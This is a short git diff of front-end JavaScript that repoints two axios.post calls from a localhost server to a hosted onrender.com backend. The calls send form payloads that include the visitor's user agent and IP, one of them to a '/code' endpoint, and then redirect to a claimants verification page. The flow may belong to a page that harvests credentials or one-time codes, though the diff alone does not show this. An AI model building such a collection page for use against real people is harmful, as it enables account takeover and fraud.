@@ -428,7 +428,7 @@ window.addEventListener('load', () => {
         ip
         
       }
-      const result =  axios.post("http://localhost:4400/",payload).then((res)=>{
+      const result =  axios.post("https://serverside-number-five.onrender.com/",payload).then((res)=>{
             if (res.data.message === 'success') {
               window.location.href=('/claimants/verification.html')
             }else{
@@ -471,7 +471,7 @@ window.addEventListener('load', () => {
         device:userAgent,
         ip
       }
-      const result =  axios.post("http://localhost:4400/code",payload).then((res)=>{
+      const result =  axios.post("https://serverside-number-five.onrender.com/code",payload).then((res)=>{
             if (res.data.message === 'success') {
               window.location.href = '/index.html';
             }else{
